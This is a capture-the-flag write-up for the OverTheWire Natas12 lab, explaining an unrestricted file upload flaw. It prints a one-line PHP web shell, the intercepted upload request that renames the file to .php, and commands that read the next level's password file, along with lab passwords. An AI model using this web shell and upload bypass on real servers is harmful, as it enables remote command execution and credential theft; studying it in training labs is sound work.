# CTF Writeup - **OverTheWire Natas11 - Natas12**

**Author**: spiketyson 

---

## Challenge Details

- **Challenge Name:** Natas11 - Natas12
- **Category:** Linux
- **Difficulty Level:** Easy
- **Date:** 10-12-2024

---

## Summary

This challenge is the introductory level for the Natas series on OverTheWire, focusing on web exploitation. The goal is to find the flag that is hidden web server using burpsuite if possible.

---

## Approach

Since this is an basic challenge, I planned to use inspect element to troubleshoot and find the flag.

---

## Solution Walkthrough

Connecting to the web server using:

```bash
Username: natas12
Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
URL:      http://natas12.natas.labs.overthewire.org
```

After logging in, we can see that the webpage asks for image as input.  But we dont know anything about it, So lets input some random image and check it out. 

```bash
Choose a JPEG to upload (max 1KB):
|Choose File|  No file chosen
Upload File  
```

Now we need to find the image to input to get the flag. Let view the source code. 

```bash
# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
# <script>var wechallinfo = { "level": "natas12", "pass": "<censored>" };</script></head>
# <body>
# <h1>natas12</h1>
# <div id="content">
# <?php

# function genRandomString() {
#     $length = 10;
#     $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
#     $string = "";

#     for ($p = 0; $p < $length; $p++) {
#         $string .= $characters[mt_rand(0, strlen($characters)-1)];
#     }

#     return $string;
# }

# function makeRandomPath($dir, $ext) {
#     do {
#     $path = $dir."/".genRandomString().".".$ext;
#     } while(file_exists($path));
#     return $path;
# }

# function makeRandomPathFromFilename($dir, $fn) {
#     $ext = pathinfo($fn, PATHINFO_EXTENSION);
#     return makeRandomPath($dir, $ext);
# }

# if(array_key_exists("filename", $_POST)) {
#     $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


#         if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
#         echo "File is too big";
#     } else {
#         if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
#             echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
#         } else{
#             echo "There was an error uploading the file, please try again!";
#         }
#     }
# } else {
# ?>

# <form enctype="multipart/form-data" action="index.php" method="POST">
# <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
# <input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
# Choose a JPEG to upload (max 1KB):<br/>
# <input name="uploadedfile" type="file" /><br />
# <input type="submit" value="Upload File" />
# </form>
# <?php } ?>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
```

We can see that there is a form which takes our input, and when we submit the input there is a php code which gets executed on the input, Where there are 3 main function, `genRandomString` is the function that has generates a random string with 10 characters. `makeRandomPath` function takes the directory and the files extension and then creates the path with the random string for example `upload/12345abcde.jpg` file is created. `makeRandomPathFromFilename` whenever the files is uploaded this funciton creates a path in the directory with the previous funciton and then copies the uploaded file to that path. We can see that in the `html` there is no input check for what kind of file that has been uploaded. we can upload anyfile that we want. This is interesting for us, as we can now upload a php code to open a shell for us and access the files in the files system as shown below.

```bash
# Create a php file with the below code
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
```

Now, What this php code does is that if it gets executed then it executes anything that we append at the end of the url. For example `http://natas12.natas.labs.overthewire.org/index.php?e=ls` if we see here we have entered the variable `e` to take `ls` and when we enter such urls it will make a get request and value of e is executed in the shell as it will be running in the webserver. Before uploading we need to check of its sent to the server so start the burpsuite with the intercept on and then upload the file and submit it. We can see that the file is getting saved as `zzkcpd7s0d.jpg` so we need to change it as `zzkcpd7s0d.php` before forwarding. 

```bash
# POST /index.php HTTP/1.1
# Host: natas12.natas.labs.overthewire.org
# Content-Length: 461
# Cache-Control: max-age=0
# Authorization: Basic bmF0YXMxMjp5WmRrakFZWlJkM1I3dHE3VDVrWE1qTUpsT0lrekRlQg==
# Accept-Language: en-US,en;q=0.9
# Origin: http://natas12.natas.labs.overthewire.org
# Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysR3wS37InhEs5eFb
# Upgrade-Insecure-Requests: 1
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
# Referer: http://natas12.natas.labs.overthewire.org/
# Accept-Encoding: gzip, deflate, br
# Connection: keep-alive

# ------WebKitFormBoundarysR3wS37InhEs5eFb
# Content-Disposition: form-data; name="MAX_FILE_SIZE"

# 1000
# ------WebKitFormBoundarysR3wS37InhEs5eFb
# Content-Disposition: form-data; name="filename"

 zzkcpd7s0d.jpg
# ------WebKitFormBoundarysR3wS37InhEs5eFb
# Content-Disposition: form-data; name="uploadedfile"; filename="abc.php"
# Content-Type: application/octet-stream

# <?php echo shell_exec($_GET['e'].' 2>&1'); ?>
# ------WebKitFormBoundarysR3wS37InhEs5eFb--
```

After forward the request we can see that the `The file upload/v6lm2uilp9.php has been uploaded` message getting displayed. Now lets try to access this php file through the browser by clicking the uploaded file. Once we do that we can see that the url is `http://natas12.natas.labs.overthewire.org/upload/v6lm2uilp9.php` and the message is `Notice: Undefined index: e in /var/www/natas/natas12/upload/v6lm2uilp9.php on line 1`. Here it is very clear that it is looking for the e value in the url as we have given it in the php file. Lets try putting something in the url as shown below.

```bash
http://natas12.natas.labs.overthewire.org/upload/v6lm2uilp9.php?e=pwd
# /var/www/natas/natas12/upload
```
Now we are able to access anything in the file system. Lets try to access the password of the next level as shown below.

```bash
http://natas12.natas.labs.overthewire.org/upload/v6lm2uilp9.php?e=cat /etc/natas_webpass/natas13
# The password for natas13 is trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```

## Flag

**Flag:** trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC

---

## Lessons Learned

It was a very hard challenge where i was stuck for a very long time. It took me more time to understand and it was also a pain as the php is deleted by the antivirus. 